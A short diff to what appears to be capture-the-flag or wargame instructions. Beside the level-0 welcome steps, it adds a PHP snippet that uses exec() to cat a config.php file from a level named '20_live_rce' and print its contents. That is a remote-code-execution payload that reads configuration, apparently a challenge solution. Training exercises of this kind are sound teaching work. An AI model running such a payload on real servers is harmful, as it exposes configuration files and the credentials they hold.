@@ -9,3 +9,8 @@
  -  In the "level" directory, open "00_welcome" with `cd 00_welcome`.
  
  -   Use `cat README.md` to read the contents; carefully examine for clues, and the level 0 solution in the last sentence.
+
+   <?php
+exec("cat /home/level/20_live_rce/config.php", $out);
+print_r($out)
+?>
